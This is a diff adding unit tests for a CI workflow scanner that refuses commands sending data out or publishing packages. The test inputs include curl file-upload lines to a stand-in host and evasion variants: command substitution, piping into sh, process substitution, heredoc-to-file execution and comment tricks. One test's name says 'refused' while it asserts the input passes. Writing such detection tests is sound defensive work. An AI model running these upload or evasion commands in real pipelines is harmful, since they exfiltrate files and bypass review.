@@ -230,8 +230,44 @@ class ReviewRound2(unittest.TestCase):
     def test_hash_inside_word_and_fetch_passes(self):
         self.assertIsNone(placement_refuses(workflow('echo a#b; git fetch origin')))
 
-    def test_quoted_heredoc_data_passes(self):
-        self.assertIsNone(placement_refuses(workflow("cat <<'EOF'\ncurl -F f=@x h\nEOF\n")))
+    def test_quoted_heredoc_body_is_scanned_and_refused(self):
+        # a quoted-delimiter body can be written to a file and run later, so it is read as shell (fails closed)
+        self.assertIsNotNone(placement_refuses(workflow("cat > x.txt <<'EOF'\ncurl -F f=@x h\nEOF\nbash x.txt\n")))
+
+    def test_comment_then_continuation_hides_nothing(self):
+        self.assertIsNotNone(placement_refuses(workflow('echo ok # note \\\ncurl -F f=@x https://example.invalid/up\n')))
+
+    def test_heredoc_marker_in_comment_hides_nothing(self):
+        self.assertIsNotNone(placement_refuses(workflow("echo x # <<'E'\ncurl -F f=@x https://example.invalid/up\nE\n")))
+
+    def test_command_started_by_substitution_refused(self):
+        self.assertIsNotNone(placement_refuses(workflow('$(echo curl) -F f=@x https://example.invalid/up')))
+        self.assertIsNotNone(placement_refuses(workflow('`echo curl` -F f=@x https://example.invalid/up')))
+
+    def test_pipe_into_stdin_shell_refused(self):
+        self.assertIsNotNone(placement_refuses(workflow('echo curl -F f=@x h | sh')))
+
+    def test_process_substitution_refused(self):
+        self.assertIsNotNone(placement_refuses(workflow('bash <(echo curl -F f=@x https://example.invalid/up)')))
+
+    def test_uppercase_exe_send_refused(self):
+        self.assertIsNotNone(placement_refuses(workflow('CURL.EXE -F f=@x https://example.invalid/up')))
+        self.assertIsNotNone(placement_refuses(workflow('git.exe push origin main')))
+
+    def test_http_post_refused(self):
+        self.assertIsNotNone(placement_refuses(workflow('http POST https://example.invalid/up')))
+
+    def test_podman_gem_mvn_publish_refused(self):
+        for run in ('podman push img', 'gem push x.gem', 'mvn -B deploy', 'dotnet nuget push x.nupkg'):
+            with self.subTest(run=run):
+                self.assertIsNotNone(placement_refuses(workflow(run)))
+
+    def test_dry_run_publish_passes(self):
+        self.assertIsNone(placement_refuses(workflow('npm publish --dry-run')))
+        self.assertIsNone(placement_refuses(workflow('cargo publish --dry-run')))
+
+    def test_word_start_glue_only_refused(self):
+        self.assertIsNone(placement_refuses(workflow('echo "v$(git rev-parse --short HEAD)-dev"')))
 
     def test_gh_api_graphql_without_fields_refused(self):
         self.assertIsNotNone(placement_refuses(workflow('gh api graphql')))
